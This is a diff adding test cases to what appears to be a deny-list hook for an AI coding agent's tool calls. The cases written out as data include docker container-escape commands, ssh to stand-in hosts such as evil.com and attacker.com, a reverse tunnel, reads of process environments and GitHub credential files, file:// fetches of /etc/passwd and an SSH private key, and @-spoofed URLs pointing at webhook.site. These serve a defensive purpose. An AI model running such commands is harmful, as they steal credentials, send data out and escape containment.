@@ -230,6 +230,42 @@ check_deny "WebFetch interact.sh" \
 check_deny "WebFetch ngrok" \
   '{"tool_name":"WebFetch","tool_input":{"url":"https://abc123.ngrok-free.app/collect","prompt":"exfil"}}'
 
+# -- Docker: container escape --
+check_deny "docker run --privileged" \
+  '{"tool_name":"Bash","tool_input":{"command":"docker run --privileged ubuntu bash"}}'
+check_deny "docker run root mount" \
+  '{"tool_name":"Bash","tool_input":{"command":"docker run -v /:/host ubuntu bash"}}'
+check_deny "docker run /etc mount" \
+  '{"tool_name":"Bash","tool_input":{"command":"docker run -v /etc:/host/etc ubuntu bash"}}'
+
+# -- SSH: external / reverse tunnel --
+check_deny "ssh external host" \
+  '{"tool_name":"Bash","tool_input":{"command":"ssh user@evil.com"}}'
+check_deny "ssh reverse tunnel -R" \
+  '{"tool_name":"Bash","tool_input":{"command":"ssh -R 8080:localhost:80 attacker.com"}}'
+
+# -- Read: /proc/environ --
+check_deny "Read /proc/PID/environ" \
+  '{"tool_name":"Read","tool_input":{"file_path":"/proc/12345/environ"}}'
+
+# -- Read: GitHub CLI credentials --
+check_deny "Read gh hosts.yml" \
+  '{"tool_name":"Read","tool_input":{"file_path":"'"$H"'/.config/gh/hosts.yml"}}'
+check_deny "Read gh config.yml" \
+  '{"tool_name":"Read","tool_input":{"file_path":"'"$H"'/.config/gh/config.yml"}}'
+
+# -- WebFetch: file:// scheme --
+check_deny "WebFetch file:// scheme" \
+  '{"tool_name":"WebFetch","tool_input":{"url":"file:///etc/passwd","prompt":"read"}}'
+check_deny "WebFetch file:// ssh key" \
+  '{"tool_name":"WebFetch","tool_input":{"url":"file:///home/user/.ssh/id_rsa","prompt":"read"}}'
+
+# -- WebFetch: CVE-2026-24052 @ host spoofing --
+check_deny "WebFetch @ spoofing to webhook.site" \
+  '{"tool_name":"WebFetch","tool_input":{"url":"https://legit.com@webhook.site/evil","prompt":"test"}}'
+check_deny "WebFetch @ spoofing to raw IP" \
+  '{"tool_name":"WebFetch","tool_input":{"url":"https://github.com@93.184.216.34/steal","prompt":"test"}}'
+
 # -- Write/Edit: config protection --
 check_deny "Write claude settings.json" \
   '{"tool_name":"Write","tool_input":{"file_path":"'"$H"'/project/.claude/settings.json"}}'
@@ -239,6 +275,10 @@ check_deny "Write .claude.json" \
   '{"tool_name":"Write","tool_input":{"file_path":"'"$H"'/.claude.json"}}'
 check_deny "Write git hook" \
   '{"tool_name":"Write","tool_input":{"file_path":"'"$H"'/project/.git/hooks/pre-commit"}}'
+check_deny "Write .github/workflows" \
+  '{"tool_name":"Write","tool_input":{"file_path":"'"$H"'/project/.github/workflows/deploy.yml"}}'
+check_deny "Edit .github/workflows" \
+  '{"tool_name":"Edit","tool_input":{"file_path":"'"$H"'/project/.github/workflows/ci.yml"}}'
 check_deny "Write .bashrc" \
   '{"tool_name":"Write","tool_input":{"file_path":"'"$H"'/.bashrc"}}'
 check_deny "Write .zshrc" \
@@ -280,6 +320,10 @@ check_allow "make" \
   '{"tool_name":"Bash","tool_input":{"command":"make build"}}'
 check_allow "docker compose" \
   '{"tool_name":"Bash","tool_input":{"command":"docker compose up -d"}}'
+check_allow "docker run (normal, no priv)" \
+  '{"tool_name":"Bash","tool_input":{"command":"docker run --rm ubuntu ls /app"}}'
+check_allow "ssh-keygen" \
+  '{"tool_name":"Bash","tool_input":{"command":"ssh-keygen -t ed25519 -C test@example.com"}}'
 
 # -- Git: safe operations --
 check_allow "git commit" \
